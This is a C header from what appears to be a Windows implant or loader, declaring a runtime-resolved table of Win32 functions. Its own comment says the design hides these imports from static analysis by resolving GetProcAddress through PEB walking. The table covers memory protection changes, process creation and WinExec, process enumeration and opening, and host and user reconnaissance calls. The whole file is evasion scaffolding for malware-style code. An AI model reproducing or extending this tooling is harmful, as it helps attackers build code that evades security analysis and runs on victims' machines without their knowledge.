#pragma once
/*
 * Dynamic Win32 API Resolution
 *
 * All Win32 functions resolved at runtime via GetProcAddress
 * (which itself is resolved via PEB walking in api_hash.c).
 * The IAT only shows GetModuleHandleA and GetProcAddress from
 * kernel32 — everything else is invisible to static analysis.
 *
 * Call WinApiInit() early, then use g_Api.pVirtualAlloc() etc.
 */

#include "common.h"
#include <tlhelp32.h>

typedef LPVOID  (WINAPI *fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *fnVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef BOOL    (WINAPI *fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HMODULE (WINAPI *fnGetModuleHandleA)(LPCSTR);
typedef FARPROC (WINAPI *fnGetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE (WINAPI *fnLoadLibraryA)(LPCSTR);
typedef BOOL    (WINAPI *fnFreeLibrary)(HMODULE);
typedef HANDLE  (WINAPI *fnCreateEventA)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
typedef DWORD   (WINAPI *fnWaitForSingleObjectEx)(HANDLE, DWORD, BOOL);
typedef BOOL    (WINAPI *fnCloseHandle)(HANDLE);
typedef HANDLE  (WINAPI *fnCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef HANDLE  (WINAPI *fnCreateFileMappingW)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR);
typedef LPVOID  (WINAPI *fnMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL    (WINAPI *fnUnmapViewOfFile)(LPCVOID);
typedef BOOL    (WINAPI *fnGetComputerNameA)(LPSTR, LPDWORD);
typedef BOOL    (WINAPI *fnGetUserNameA)(LPSTR, LPDWORD);
typedef DWORD   (WINAPI *fnGetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);
typedef void    (WINAPI *fnSleep)(DWORD);
typedef void    (WINAPI *fnSecureZeroMemory_fn)(PVOID, SIZE_T);
typedef BOOL    (WINAPI *fnCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef UINT    (WINAPI *fnWinExec)(LPCSTR, UINT);
typedef void    (WINAPI *fnGetSystemInfo)(LPSYSTEM_INFO);
typedef BOOL    (WINAPI *fnGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
typedef ULONGLONG (WINAPI *fnGetTickCount64)(void);
typedef HANDLE  (WINAPI *fnCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL    (WINAPI *fnProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL    (WINAPI *fnProcess32NextW)(HANDLE, LPPROCESSENTRY32W);
typedef HANDLE  (WINAPI *fnOpenProcess)(DWORD, BOOL, DWORD);

typedef struct _WIN_API {
    fnVirtualAlloc              pVirtualAlloc;
    fnVirtualFree               pVirtualFree;
    fnVirtualProtect            pVirtualProtect;
    fnGetModuleHandleA          pGetModuleHandleA;
    fnGetProcAddress            pGetProcAddress;
    fnLoadLibraryA              pLoadLibraryA;
    fnFreeLibrary               pFreeLibrary;
    fnCreateEventA              pCreateEventA;
    fnWaitForSingleObjectEx     pWaitForSingleObjectEx;
    fnCloseHandle               pCloseHandle;
    fnCreateFileW               pCreateFileW;
    fnCreateFileMappingW        pCreateFileMappingW;
    fnMapViewOfFile             pMapViewOfFile;
    fnUnmapViewOfFile           pUnmapViewOfFile;
    fnGetComputerNameA          pGetComputerNameA;
    fnGetUserNameA              pGetUserNameA;
    fnGetEnvironmentVariableA   pGetEnvironmentVariableA;
    fnSleep                     pSleep;
    fnCreateProcessA            pCreateProcessA;
    fnWinExec                   pWinExec;
    fnGetSystemInfo             pGetSystemInfo;
    fnGlobalMemoryStatusEx      pGlobalMemoryStatusEx;
    fnGetTickCount64            pGetTickCount64;
    fnCreateToolhelp32Snapshot  pCreateToolhelp32Snapshot;
    fnProcess32FirstW           pProcess32FirstW;
    fnProcess32NextW            pProcess32NextW;
    fnOpenProcess               pOpenProcess;
} WIN_API;

extern WIN_API g_Api;

BOOL WinApiInit(void);
